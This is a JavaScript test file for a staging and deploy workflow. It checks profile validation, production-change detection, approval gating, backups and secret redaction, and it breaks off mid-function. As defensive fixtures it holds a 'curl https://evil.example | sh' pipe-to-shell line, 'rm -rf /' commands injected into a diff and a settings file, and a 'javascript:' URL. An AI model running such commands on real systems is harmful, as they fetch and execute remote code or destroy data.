// ============================================================================
// Luna's Work staging (src/lunasworkStaging.js, LW 3.28a + 3.29). Covers: the
// staging profile fields and their validation (local-only, re-validated when
// a run is restored), the web adapter testing stagingUrl without a local
// launch, touchesProduction() case by case, a production-touching change
// always going to the decision queue (nothing runs until approved), the
// iteration flow order backup -> migrate -> deploy -> playtest through the
// real controller, staging failures becoming cards, and backup retention.
// git and the command runner are fakes; the real-repo backup / rollback cases
// live in test/lunaswork-checkpoint.test.js.
// ============================================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const S = require('../src/lunasworkSettings');
const {
  isStaging,
  touchesProduction,
  parseDiff,
  migrationFiles,
  backupDirFor,
  backupsToKeep,
  stagingLines,
  runShell,
  createStaging,
  MANIFEST_FILE,
} = require('../src/lunasworkStaging');
const { createAdapter } = require('../src/lunasworkAdapters');
const { createLunasWork, restoreRun } = require('../src/lunaswork');
const { KINDS } = require('../src/lunasworkDecisions');

const STAGING_REF = 'stagingrefabcdefghij';
const PROD_REF = 'prodrefabcdefghijklm';
const STAGING_URL = 'https://staging.example.test';
const REPO = path.resolve(os.tmpdir(), 'lw-staging-repo');
const RUN_ID = 'lwstage1';
const CLOCK = 1_800_000_000_000;
const HEAD = 'a'.repeat(40);
const BASE = 'b'.repeat(40);

const RAW_PROFILE = {
  adapter: 'web',
  startCommand: 'npm start',
  url: 'http://localhost:3000',
  readyTimeoutSec: 60,
  checkCommand: '',
  stagingUrl: `  ${STAGING_URL}  `,
  stagingMigrateCommand: ` supabase db push --project-ref ${STAGING_REF} && supabase functions deploy --project-ref ${STAGING_REF} `,
  stagingDeployCommand: 'vercel deploy --yes --scope staging',
  stagingBackupCommand: `supabase db dump --project-ref ${STAGING_REF} --data-only -f "%LUNA_BACKUP_DIR%/data.sql"`,
  stagingRestoreCommand: 'psql "%STAGING_DB_URL%" -f "%LUNA_BACKUP_DIR%/data.sql"',
};
const PROFILE = S.validateProfile(RAW_PROFILE).profile;

function tmpDir(t, prefix) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
}

/** A unified diff, the shape `git diff --unified=0` prints. */
function diffOf(files) {
  return (
    files
      .map((f) =>
        [
          `diff --git a/${f.path} b/${f.path}`,
          ...(f.status === 'added' ? ['new file mode 100644'] : f.status === 'deleted' ? ['deleted file mode 100644'] : []),
          `--- a/${f.path}`,
          `+++ b/${f.path}`,
          '@@ -1 +1 @@',
          ...(f.removed || []).map((l) => `-${l}`),
          ...(f.added || []).map((l) => `+${l}`),
        ].join('\n'),
      )
      .join('\n') + '\n'
  );
}

/** git as the staging flow asks it: HEAD, the base before the run, the diff. */
function fakeGit(diff = '') {
  const g = { head: HEAD, base: BASE, diff, calls: [] };
  g.fn = async (cwd, args) => {
    g.calls.push(args);
    if (args[0] === 'rev-parse') return { ok: true, out: g.head, err: '' };
    if (args[0] === 'merge-base') return { ok: true, out: '', err: '' };
    if (args[0] === 'rev-list') return { ok: true, out: g.base, err: '' };
    if (args[0] === 'diff') return { ok: true, out: g.diff, err: '' };
    return { ok: false, out: '', err: `unexpected git ${args[0]}` };
  };
  return g;
}

/** The command runner: records each step, fails the ones named in `fail`. */
function fakeRunner(fail = {}, events = null) {
  const r = { calls: [] };
  r.fn = async (o) => {
    r.calls.push({ step: o.step, command: o.command, cwd: o.cwd, env: o.env });
    if (events) events.push(o.step);
    return fail[o.step] ? { ok: false, code: 1, detail: fail[o.step] } : { ok: true, code: 0, detail: '' };
  };
  return r;
}

function memoryStore(list = []) {
  const store = {
    list,
    read: () => store.list,
    write: (next) => {
      store.list = next;
      return true;
    },
  };
  return store;
}

/** applyIteration's ctx over a plain run, with a decision queue of its own. */
function flowCtx(runFields = {}, store = memoryStore()) {
  const c = { asked: [], events: [], decisions: [], store };
  const run = { id: RUN_ID, iteration: 2, repoPath: REPO, profile: PROFILE, startedAt: CLOCK, history: [], laps: [], ...runFields };
  c.ctx = {
    run: () => ({ ...run, decisions: c.decisions }),
    ask: (spec) => {
      const id = 1000 + c.asked.length;
      c.asked.push(spec);
      c.decisions = [...c.decisions, { id, kind: spec.kind, status: 'pending', answer: null }];
      return { ok: true, id };
    },
    logEvent: (text) => c.events.push(text),
    todoStore: store,
  };
  c.answer = (id, answer) => {
    c.decisions = c.decisions.map((d) => (d.id === id ? { ...d, status: 'answered', answer } : d));
  };
  return c;
}

// ---- profile ----------------------------------------------------------------------------

test('profile: every staging field is validated like startCommand / url and kept trimmed', () => {
  const { profile, reason } = S.validateProfile(RAW_PROFILE);
  assert.equal(reason, null);
  assert.equal(profile.stagingUrl, STAGING_URL);
  assert.equal(profile.stagingMigrateCommand, RAW_PROFILE.stagingMigrateCommand.trim());
  for (const key of S.STAGING_COMMANDS) assert.equal(profile[key], RAW_PROFILE[key].trim(), key);
  // No staging: the profile looks exactly as before, no empty staging keys.
  const plain = S.validateProfile({ startCommand: 'npm start', stagingUrl: '', stagingDeployCommand: '  ' }).profile;
  assert.deepEqual(Object.keys(plain).sort(), ['adapter', 'checkCommand', 'readyTimeoutSec', 'startCommand', 'url']);
  assert.equal(isStaging(plain), false);
  assert.equal(isStaging(profile), true);
});

test('profile: a malformed staging field rejects the whole profile', () => {
  for (const key of S.STAGING_COMMANDS) {
    for (const bad of [42, ['npm'], 'line one\nline two', 'tab\there\u0000', 'x'.repeat(S.MAX_COMMAND_CHARS + 1)]) {
      const r = S.validateProfile({ ...RAW_PROFILE, [key]: bad });
      assert.equal(r.profile, null, `${key}=${JSON.stringify(bad).slice(0, 40)}`);
      assert.match(r.reason, new RegExp(key));
    }
  }
  for (const bad of ['ftp://staging.example.test', 'not a url', 42, 'javascript:alert(1)']) {
    const r = S.validateProfile({ ...RAW_PROFILE, stagingUrl: bad });
    assert.equal(r.profile, null, `stagingUrl=${String(bad)}`);
    assert.match(r.reason, /stagingUrl/);
  }
});

test('profile: staging commands need a stagingUrl; backup + restore pair up; migrate needs both', () => {
  const { stagingUrl, ...noUrl } = RAW_PROFILE;
  assert.match(S.validateProfile(noUrl).reason, /need a stagingUrl/);
  assert.match(S.validateProfile({ ...RAW_PROFILE, stagingRestoreCommand: undefined }).reason, /go together/);
  assert.match(S.validateProfile({ ...RAW_PROFILE, stagingBackupCommand: '' }).reason, /go together/);
  const noSnapshots = { ...RAW_PROFILE, stagingBackupCommand: undefined, stagingRestoreCommand: undefined };
  assert.match(S.validateProfile(noSnapshots).reason, /stagingMigrateCommand needs stagingBackupCommand/);
  // Deploy only (no schema changes from LunaCore) needs no snapshots.
  const deployOnly = { ...noSnapshots, stagingMigrateCommand: undefined };
  assert.ok(S.validateProfile(deployOnly).profile);
  assert.ok(S.validateProfile({ startCommand: 'npm start', stagingUrl: STAGING_URL }).profile, 'a staging URL alone is enough');
});

test('profile: local-only - read from LunaCore settings, re-validated when a stored run comes back', (t) => {
  const dir = tmpDir(t, 'lw-staging-settings-');
  const file = path.join(dir, 'lunaswork-settings.local.json');
  const { settings, reason } = S.withProject({}, 'game', { profile: RAW_PROFILE });
  assert.equal(reason, null);
  assert.equal(S.writeSettings(settings, file), true);
  assert.deepEqual(S.profileFor(S.readSettings(file), 'game'), PROFILE);
  // A hand-edited settings file with a multi-line staging command loses the profile.
  const raw = JSON.parse(fs.readFileSync(file, 'utf8'));
  raw.projects[Object.keys(raw.projects)[0]].profile.stagingDeployCommand = 'deploy\nrm -rf /';
  fs.writeFileSync(file, JSON.stringify(raw));
  assert.equal(S.profileFor(S.readSettings(file), 'game'), null);
  // The pinned profile of a stored run is re-validated: a tampered one is dropped
  // (the controller then stops with noProfile instead of running it).
  const stored = { id: RUN_ID, projectId: 'game', repoPath: REPO, phase: 'launching', iteration: 1, profile: PROFILE, history: [] };
  assert.deepEqual(restoreRun(stored).profile, PROFILE);
  assert.equal(restoreRun({ ...stored, profile: { ...PROFILE, stagingMigrateCommand: 'a\nb' } }).profile, null);
});

test('the start confirmation lists the staging URL and every staging command', () => {
  const lines = stagingLines(PROFILE).join('\n');
  for (const key of S.STAGING_COMMANDS) assert.ok(lines.includes(PROFILE[key]), key);
  assert.ok(lines.includes(STAGING_URL));
  assert.deepEqual(stagingLines(S.validateProfile({ startCommand: 'npm start' }).profile), []);
  assert.ok(KINDS.includes('production'), 'the decision queue knows the production kind');
});

// ---- the web adapter --------------------------------------------------------------------

test('Playtester target: with stagingUrl the web adapter launches nothing and waits for staging', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-adapter-');
  const spawned = [];
  const fetched = [];
  const adapter = createAdapter('web', {
    projectDir: REPO,
    runId: RUN_ID,
    iteration: 1,
    runsRoot,
    spawn: (...args) => {
      spawned.push(args);
      throw new Error('no local launch in staging');
    },
    fetch: async (url) => {
      fetched.push(url);
      return { status: 200 };
    },
    now: () => 0,
    sleep: async () => {},
  });
  assert.deepEqual(await adapter.start(PROFILE), { url: STAGING_URL });
  assert.equal(spawned.length, 0);
  assert.deepEqual(fetched, [STAGING_URL]);
  const args = adapter.tools().mcpConfig.mcpServers.playwright.args;
  assert.equal(args[args.indexOf('--allowed-origins') + 1], STAGING_URL);
  assert.equal(await adapter.stop(), true);
});

test('the web adapter without staging still launches the start command (unchanged)', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-adapter-');
  let clock = 0;
  const spawned = [];
  const adapter = createAdapter('web', {
    projectDir: REPO,
    runId: RUN_ID,
    iteration: 1,
    runsRoot,
    spawn: (cmd) => {
      spawned.push(cmd);
      const { EventEmitter } = require('events');
      const child = new EventEmitter();
      child.pid = undefined;
      return child;
    },
    fetch: async () => ({ status: 200 }),
    now: () => clock++,
    sleep: async () => {},
  });
  const plain = S.validateProfile({ startCommand: 'npm run dev', url: 'http://localhost:5173' }).profile;
  assert.deepEqual(await adapter.start(plain), { url: 'http://localhost:5173' });
  assert.deepEqual(spawned, ['npm run dev']);
  await adapter.stop();
});

test('staging that never answers fails the start with the staging URL in the reason', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-adapter-');
  let clock = 0;
  const adapter = createAdapter('web', {
    projectDir: REPO,
    runId: RUN_ID,
    iteration: 1,
    runsRoot,
    spawn: () => assert.fail('no spawn'),
    fetch: async () => ({ status: 503 }),
    now: () => (clock += 1000),
    sleep: async () => {},
  });
  await assert.rejects(adapter.start({ ...PROFILE, readyTimeoutSec: 3 }), /did not answer at https:\/\/staging\.example\.test within 3s/);
});

// ---- touchesProduction --------------------------------------------------------------------

const prodOf = (files) => touchesProduction(diffOf(files), PROFILE);
const hitTexts = (res) => (res ? res.hits.map((h) => h.text) : []);

test('touchesProduction: a clean diff is null', () => {
  assert.equal(prodOf([{ path: 'src/app.ts', added: ['export const x = 1;', 'fetch("/api/quotes")'] }]), null);
  assert.equal(touchesProduction('', PROFILE), null);
  assert.equal(touchesProduction(null, null), null);
});

test('touchesProduction: --prod flags (but not `npm ci --production`)', () => {
  assert.deepEqual(hitTexts(prodOf([{ path: 'package.json', added: ['"ship": "vercel deploy --prod"'] }])), ['--prod flag']);
  assert.deepEqual(hitTexts(prodOf([{ path: 'deploy.sh', added: ['netlify deploy --production'] }])), ['--production flag']);
  assert.equal(prodOf([{ path: 'Dockerfile', added: ['RUN npm ci --production'] }]), null);
  assert.equal(prodOf([{ path: 'x.sh', added: ['tool --products --prodigy'] }]), null);
});

test('touchesProduction: project refs other than the staging one', () => {
  const res = prodOf([
    {
      path: 'supabase/functions/quote/index.ts',
      added: [`const url = "https://${PROD_REF}.supabase.co";`, `const stage = "https://${STAGING_REF}.supabase.co";`],
    },
    { path: 'scripts/db.sh', added: [`psql postgresql://postgres.${PROD_REF}:pw@aws-0-eu-central-1.pooler.supabase.com:6543/postgres`] },
  ]);
  assert.deepEqual(hitTexts(res), [`project ref ${PROD_REF}`, `project ref ${PROD_REF}`]);
  assert.deepEqual(res.hits.map((h) => h.file), ['supabase/functions/quote/index.ts', 'scripts/db.sh'], 'one hit per file');
  assert.equal(res.reason, `touches production: project ref ${PROD_REF}`);
  assert.equal(prodOf([{ path: 'a.ts', added: [`createClient("https://${STAGING_REF}.supabase.co")`] }]), null);
});

test('touchesProduction: production commands and prod hosts', () => {
  const res = prodOf([
    { path: '.github/workflows/ci.yml', added: ['      - run: supabase db push', '      - run: fly deploy'] },
    { path: 'src/config.ts', added: ['export const API = "https://api.prod.example.com/v1";', 'const cdn = "https://myapp-production.vercel.app";'] },
  ]);
  assert.deepEqual(hitTexts(res).sort(), [
    '"supabase db push" without the staging project ref',
    'URL host api.prod.example.com',
    'URL host myapp-production.vercel.app',
    'deploy command "fly deploy"',
  ]);
  // The staging ref on the same line makes it the staging project; `products` is not `prod`.
  assert.equal(prodOf([{ path: 'package.json', added: [`"db": "supabase db push --project-ref ${STAGING_REF}"`] }]), null);
  assert.equal(prodOf([{ path: 'a.ts', added: ['fetch("https://products.example.com/list")', `fetch("${STAGING_URL}/api")`] }]), null);
});

test('touchesProduction: production env names and files (NODE_ENV is a build mode, not a target)', () => {
  const res = prodOf([
    { path: '.github/workflows/deploy.yml', added: ['    environment: production'] },
    { path: 'scripts/release.sh', added: ['APP_ENV=production node migrate.js', 'wrangler deploy --env production'] },
    { path: 'wrangler.toml', added: ['[env.production]'] },
    { path: '.env.production', status: 'added', added: ['API_KEY=x'] },
  ]);
  const texts = hitTexts(res);
  assert.ok(texts.includes('production file .env.production'), texts.join(' | '));
  assert.equal(texts.filter((t) => t.startsWith('production env')).length, 4, texts.join(' | '));
  assert.equal(prodOf([{ path: 'package.json', added: ['"build": "NODE_ENV=production next build"'] }]), null);
  assert.equal(prodOf([{ path: 'src/a.ts', added: ["if (env === 'production') log()"] }]), null);
  assert.equal(prodOf([{ path: '.env.production', status: 'deleted', removed: ['API_KEY=x'] }]), null, 'deleting it touches nothing');
});

test('touchesProduction: removed lines and prose never count', () => {
  assert.equal(prodOf([{ path: 'deploy.sh', removed: ['vercel --prod'], added: ['vercel deploy'] }]), null);
  assert.equal(prodOf([{ path: 'README.md', added: ['Ship with `vercel --prod` and APP_ENV=production'] }]), null);
  assert.equal(prodOf([{ path: 'design/DECISIONS.md', added: [`- uses https://${PROD_REF}.supabase.co`] }]), null);
});

test('touchesProduction: an install never hides a real --prod; pnpm --prod and docker --target are no deploys', () => {
  assert.deepEqual(hitTexts(prodOf([{ path: 'Dockerfile', added: ['RUN npm ci --production && vercel deploy --prod'] }])), ['--prod flag']);
  assert.equal(prodOf([{ path: 'Dockerfile', added: ['RUN pnpm install --prod --frozen-lockfile'] }]), null);
  assert.equal(prodOf([{ path: 'ci.sh', added: ['docker build --target production -t app .'] }]), null);
});

test('touchesProduction: templates and docs paths are no production files', () => {
  assert.equal(prodOf([{ path: '.env.production.example', status: 'added', added: ['API_KEY='] }]), null);
  assert.equal(prodOf([{ path: 'docs/production/runbook.md', status: 'added', added: ['steps'] }]), null);
});

test('touchesProduction: nothing hides - every hit counts, past column 2000 and across a window edge', () => {
  const many = prodOf([{ path: 'deploy.sh', added: Array.from({ length: 30 }, (_, i) => `vercel deploy --prod # ${i}`) }]);
  assert.equal(many.hits.length, 30);
  assert.equal(new Set(many.hits.map((h) => h.key)).size, 30, 'one key per line');
  const long = prodOf([{ path: 'dist/app.min.js', added: [`${'a'.repeat(5000)}"https://${PROD_REF}.supabase.co"${'b'.repeat(100)}`] }]);
  assert.deepEqual(hitTexts(long), [`project ref ${PROD_REF}`]);
  const edge = prodOf([{ path: 'x.js', added: [`${'a'.repeat(1990)} https://${PROD_REF}.supabase.co`] }]);
  assert.deepEqual(hitTexts(edge), [`project ref ${PROD_REF}`]);
  // The same text in two files is two hits: approving one never covers the other.
  const twice = prodOf([{ path: 'a.sh', added: ['vercel --prod'] }, { path: 'b.sh', added: ['vercel --prod'] }]);
  assert.equal(twice.hits.length, 2);
});

test('parseDiff + migrationFiles: files, statuses, added lines, schema changes', () => {
  const diff = diffOf([
    { path: 'supabase/migrations/20261027_quotes.sql', status: 'added', added: ['create table quotes (id int);'] },
    { path: 'src/old.ts', status: 'deleted', removed: ['x'] },
    { path: 'src/app.ts', added: ['+++ not a header'] },
  ]);
  const parsed = parseDiff(diff);
  assert.deepEqual(parsed.files.map((f) => [f.path, f.status]), [
    ['supabase/migrations/20261027_quotes.sql', 'added'],
    ['src/old.ts', 'deleted'],
    ['src/app.ts', 'modified'],
  ]);
  assert.deepEqual(parsed.added.map((a) => a.text), ['create table quotes (id int);', '+++ not a header']);
  assert.deepEqual(migrationFiles(diff), ['supabase/migrations/20261027_quotes.sql']);
});

// ---- the flow, module level ------------------------------------------------------------------

test('a production-touching change always goes to the decision queue - nothing runs until approved', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  const git = fakeGit(diffOf([{ path: 'package.json', added: ['"ship": "vercel deploy --prod"'] }, { path: 'supabase/migrations/1_a.sql', added: ['alter table q add column x int;'] }]));
  const runner = fakeRunner();
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => runsRoot });
  const c = flowCtx();

  const held = await staging.applyIteration(c.ctx);
  assert.equal(held.ok, false);
  assert.equal(held.code, 'productionHeld');
  assert.equal(c.asked.length, 1);
  assert.equal(c.asked[0].kind, 'production');
  assert.equal(c.asked[0].defaultAnswer, 'reject', 'no answer means nothing is applied');
  assert.match(c.asked[0].detail, /--prod flag/);
  assert.deepEqual(runner.calls, [], 'not even the backup ran');

  // Still pending: asked once only, still held.
  assert.equal((await staging.applyIteration(c.ctx)).code, 'productionHeld');
  assert.equal(c.asked.length, 1);
  assert.deepEqual(runner.calls, []);

  // Mati approves: the staging flow goes on (backup first, the diff has a migration).
  c.answer(1000, 'approve');
  const applied = await staging.applyIteration(c.ctx);
  assert.equal(applied.ok, true, JSON.stringify(applied));
  assert.deepEqual(runner.calls.map((r) => r.step), ['backup', 'migrate', 'deploy']);
  assert.equal(c.asked.length, 1);
});

test('a rejected production change stays held and becomes one card; a new hit is asked again', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  const git = fakeGit(diffOf([{ path: '.env.production', status: 'added', added: ['X=1'] }]));
  const runner = fakeRunner();
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => runsRoot });
  const c = flowCtx();
  await staging.applyIteration(c.ctx);
  c.answer(1000, 'reject');
  assert.equal((await staging.applyIteration(c.ctx)).code, 'productionHeld');
  assert.equal((await staging.applyIteration(c.ctx)).code, 'productionHeld');
  const cards = c.store.list.filter((x) => /production-touching change Mati rejected/.test(x.text));
  assert.equal(cards.length, 1, 'one card, not one per iteration');
  assert.match(cards[0].details, /\.env\.production/);
  assert.ok(cards[0].tags.includes(`run:${RUN_ID}`));
  assert.deepEqual(runner.calls, []);
  // Another production reference shows up: that one is asked about on its own.
  git.diff += diffOf([{ path: 'deploy.sh', added: ['railway up'] }]);
  await staging.applyIteration(c.ctx);
  assert.equal(c.asked.length, 2);
  assert.match(c.asked[1].detail, /railway up/);
  assert.doesNotMatch(c.asked[1].detail, /\.env\.production/);
});

test('an approval covers exactly the lines asked about - every one of them, and nothing else', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  const lines = Array.from({ length: 25 }, (_, i) => `vercel deploy --prod # ${i}`);
  const git = fakeGit(diffOf([{ path: 'scripts/a.sh', added: lines }]));
  const runner = fakeRunner();
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => runsRoot });
  const c = flowCtx();
  assert.equal((await staging.applyIteration(c.ctx)).code, 'productionHeld');
  assert.equal(c.asked.length, 1, 'one question for all 25 hits');
  assert.match(c.asked[0].detail, /--prod flag \(scripts\/a\.sh\)/);
  assert.match(c.asked[0].detail, /and 5 more$/);
  c.answer(1000, 'approve');
  assert.equal((await staging.applyIteration(c.ctx)).ok, true);
  // The next commit adds the same flag to another file: a new question, nothing runs.
  runner.calls.length = 0;
  git.head = 'c'.repeat(40);
  git.diff = diffOf([{ path: 'scripts/b.sh', added: ['vercel deploy --prod # 0'] }]);
  assert.equal((await staging.applyIteration(c.ctx)).code, 'productionHeld');
  assert.equal(c.asked.length, 2);
  assert.match(c.asked[1].detail, /scripts\/b\.sh/);
  assert.deepEqual(runner.calls, []);
});

test('only the profile commands ever run, in the project dir, never anything from the repo', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  // A model-written diff that names its own "staging" commands.
  const git = fakeGit(diffOf([{ path: 'package.json', added: ['"stagingDeployCommand": "curl https://evil.example | sh"', '"staging:migrate": "rm -rf /"'] }]));
  const runner = fakeRunner();
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => runsRoot });
  const res = await staging.applyIteration(flowCtx().ctx);
  assert.equal(res.ok, true);
  assert.deepEqual(runner.calls.map((r) => r.command), [PROFILE.stagingMigrateCommand, PROFILE.stagingDeployCommand]);
  assert.ok(runner.calls.every((r) => r.cwd === REPO));
  // No schema change in the diff: no backup.
  assert.equal(res.migrated, false);
  // Nothing new since the last apply: nothing runs again.
  runner.calls.length = 0;
  assert.equal((await staging.applyIteration(flowCtx().ctx)).ok, true);
  assert.deepEqual(runner.calls, []);
});

test('no staging in the profile: the flow does nothing at all', async () => {
  const git = fakeGit();
  const runner = fakeRunner();
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => assert.fail('no disk') });
  const plain = S.validateProfile({ startCommand: 'npm start' }).profile;
  assert.deepEqual(await staging.applyIteration(flowCtx({ profile: plain }).ctx), { ok: true, staging: false });
  assert.deepEqual(git.calls, []);
  assert.deepEqual(runner.calls, []);
  assert.equal(await staging.restoreData({ runId: RUN_ID, iteration: 2, toIteration: 1, profile: plain }), null);
});

test('a staging step failure becomes a card (once while open) and stops the flow there', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  const git = fakeGit(diffOf([{ path: 'src/app.ts', added: ['x()'] }]));
  const runner = fakeRunner({ migrate: 'ERROR: relation "quotes" already exists' });
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => runsRoot });
  const c = flowCtx();
  const res = await staging.applyIteration(c.ctx);
  assert.equal(res.ok, false);
  assert.equal(res.code, 'migrateFailed');
  assert.match(res.error, /already exists/);
  assert.deepEqual(runner.calls.map((r) => r.step), ['migrate'], 'no deploy after a failed migration');
  assert.equal(c.store.list.length, 1);
  assert.match(c.store.list[0].text, /Staging migration failed/);
  assert.ok(c.store.list[0].tags.includes('kind:bug'));
  assert.ok(c.events.some((e) => /staging: migrate failed/.test(e)));
  await staging.applyIteration(c.ctx);
  assert.equal(c.store.list.length, 1, 'the open card is not filed twice');
});

test('credentials in command output never reach a card or the run log', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  const git = fakeGit(diffOf([{ path: 'src/app.ts', added: ['x()'] }]));
  const runner = fakeRunner({ deploy: 'could not connect to postgresql://postgres.abc:SuperSecret1@db.example.test:5432/postgres password=hunter22' });
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => runsRoot });
  const c = flowCtx();
  const res = await staging.applyIteration(c.ctx);
  assert.equal(res.code, 'deployFailed');
  const seen = [res.error, ...c.events, c.store.list[0].details].join('\n');
  assert.doesNotMatch(seen, /SuperSecret1|hunter22/);
  assert.match(seen, /postgresql:\/\/\*\*\*@db\.example\.test/);
});

test('a rollback never restores a later snapshot when the one it needs was pruned', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  const git = fakeGit(diffOf([{ path: 'supabase/migrations/2_a.sql', status: 'added', added: ['create table a (id int);'] }]));
  const runner = fakeRunner();
  const staging = createStaging({ git: git.fn, runCommand: runner.fn, runsRoot: () => runsRoot });
  const store = memoryStore();
  assert.equal((await staging.applyIteration(flowCtx({ iteration: 2 }, store).ctx)).ok, true);
  git.head = 'c'.repeat(40);
  git.diff = diffOf([{ path: 'supabase/migrations/3_b.sql', status: 'added', added: ['create table b (id int);'] }]);
  assert.equal((await staging.applyIteration(flowCtx({ iteration: 3 }, store).ctx)).ok, true);
  fs.rmSync(backupDirFor(runsRoot, RUN_ID, 2), { recursive: true, force: true });
  runner.calls.length = 0;
  const res = await staging.restoreData({ repoPath: REPO, runId: RUN_ID, iteration: 3, toIteration: 1, profile: PROFILE, todoStore: store });
  assert.deepEqual({ restored: res.restored, error: res.error, iteration: res.iteration }, { restored: false, error: 'snapshotMissing', iteration: 2 });
  assert.deepEqual(runner.calls, [], 'the iter-3 snapshot holds migrated data - it is not restored');
  assert.ok(store.list.some((x) => /Staging data was not restored/.test(x.text)));
  // A rollback to 2 needs exactly the iter-3 snapshot, which is there.
  const ok = await staging.restoreData({ repoPath: REPO, runId: RUN_ID, iteration: 3, toIteration: 2, profile: PROFILE, todoStore: store });
  assert.deepEqual({ restored: ok.restored, iteration: ok.iteration }, { restored: true, iteration: 3 });
});

test('runShell: runs in cwd with the step env, logs, and reports the exit with the output tail', async (t) => {
  const dir = tmpDir(t, 'lw-staging-shell-');
  const logFile = path.join(dir, 'evidence', 'staging.log');
  const node = JSON.stringify(process.execPath);
  const ok = await runShell({
    command: `${node} -e "console.log(process.env.LUNA_STAGING_STEP + ' ' + process.cwd())"`,
    cwd: dir,
    env: { LUNA_STAGING_STEP: 'deploy' },
    logFile,
  });
  assert.equal(ok.ok, true);
  assert.equal(ok.code, 0);
  const logged = fs.readFileSync(logFile, 'utf8');
  assert.match(logged, /\[lunaswork\] \$ /);
  assert.ok(logged.includes(`deploy ${fs.realpathSync(dir)}`) || logged.includes(`deploy ${dir}`), logged);
  assert.match(logged, /\[lunaswork\] ok/);

  const bad = await runShell({ command: `${node} -e "console.error('relation exists'); process.exit(3)"`, cwd: dir, env: {}, logFile });
  assert.deepEqual({ ok: bad.ok, code: bad.code }, { ok: false, code: 3 });
  assert.match(bad.detail, /relation exists/);
});

test('runShell: a log that cannot be written never crashes or hangs the step', async (t) => {
  const dir = tmpDir(t, 'lw-staging-shell-');
  // The log path is a directory: the stream fails asynchronously.
  const res = await runShell({ command: `${JSON.stringify(process.execPath)} -e "process.exit(0)"`, cwd: dir, env: {}, logFile: dir });
  assert.equal(res.ok, true);
});

// ---- retention -------------------------------------------------------------------------------

test('backupsToKeep: the last K, gates / SHIP / rolled back, and the one a rollback needs', () => {
  const history = [1, 2, 3, 4, 5, 6, 7, 8].map((n) => ({ n, milestone: n <= 4 ? 'core' : 'polish', selfCheck: n <= 2 || n === 4 ? 'green' : 'red', rolledBack: n === 5 }));
  const laps = [{ n: 6, criticVerdict: 'ship' }];
  const keep = backupsToKeep({ iterations: [1, 3, 5, 6, 7, 8], history, laps, current: 8, keepLast: 1 });
  // 8 last + current, 4 the gate of "core" (no backup there), 5 rolled back, 6 SHIP.
  assert.deepEqual([...keep].filter((n) => [1, 3, 5, 6, 7, 8].includes(n)).sort((a, b) => a - b), [5, 6, 8]);
  // Nothing rolled back and no SHIP: only the rollback rule keeps 5, the first backup after 4.
  const plain = history.map((r) => ({ ...r, rolledBack: false }));
  const needed = backupsToKeep({ iterations: [1, 3, 5, 6, 7, 8], history: plain, laps: [], current: 8, keepLast: 1 });
  assert.deepEqual([...needed].filter((n) => [1, 3, 5, 6, 7, 8].includes(n)).sort((a, b) => a - b), [5, 8]);
  const noGood = backupsToKeep({ iterations: [1, 3, 5], history: [{ n: 1, selfCheck: 'red' }], current: 5, keepLast: 1 });
  assert.ok(noGood.has(1), 'nothing good yet: the first backup is the one a rollback would need');
});

test('old backups are pruned after a new one, the needed and the recent ones stay', async (t) => {
  const runsRoot = tmpDir(t, 'lw-staging-flow-');
  for (const n of [1, 2, 3, 4, 5]) {
    const dir = backupDirFor(runsRoot, RUN_ID, n);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, MANIFEST_FILE), JSON.stringify({ iteration: n, tag: `luna-work/${RUN_ID}/iter-${n}` }));
  }
  const git = fakeGit(diffOf([{ path: 'supabase/migrations/9_b.sql', added: ['create table b (id int);'] }]));
  const staging = createStaging({ git: git.fn, runCommand: fakeRunner().fn, runsRoot: () => runsRoot });
  const history = [1, 2, 3, 4, 5].map((n) => ({ n, milestone: 'core', selfCheck: n === 1 ? 'green' : 'red' }));
  const res = await staging.applyIteration(flowCtx({ iteration: 6, history }).ctx);
  assert.equal(res.ok, true, JSON.stringify(res));
  const left = fs.readdirSync(path.join(runsRoot, `lunaswork-${RUN_ID}`, 'backups')).sort();
  // Kept: 2 (first after the last good iteration 1), 4 + 5 + 6 (the last three).
  assert.deepEqual(left, ['iter-2', 'iter-4', 'iter-5', 'iter-6']);
});

// ---- the flow, through the real controller -------------------------------------------------

/** One full iteration of the real controller; the Critic stops the run after it. */
async function oneIteration(t, { diff, fail = {} }) {
  const runsRoot = tmpDir(t, 'lw-staging-ctl-');
  const h = { todos: [{ at: 1, text: 'card 1', done: false, tags: [`run:${RUN_ID}`], size: 'S' }], events: [], stored: null, ctl: null };
  const runner = fakeRunner(fail, h.events);
  const git = fakeGit(diff);
  const deps = {
    store: {
      load: () => h.stored,
      save: (d) => {
        h.stored = JSON.parse(JSON.stringify(d));
        return true;
      },
    },
    settings: () => ({ models: {}, freeFallback: false, projects: {} }),
    projectOf: (id) => ({ id, repoPath: REPO }),
    profileFor: () => PROFILE,
    packStatus: () => ({ complete: true }),
    godModeActive: () => false,
    todoStore: () => ({
      read: () => h.todos,
      write: (list) => {
        h.todos = list;
        return true;
      },
    }),
    director: async () => ({ ok: true, cards: h.todos.filter((x) => !x.done && x.at === 1), model: 'opus', modelReason: 'setting' }),
    build: async (o) => {
      const ats = new Set(o.cards.map((c) => c.at));
      h.todos = h.todos.map((x) => (ats.has(x.at) ? { ...x, done: true } : x));
      return {
        ok: true,
        planId: 'p1',
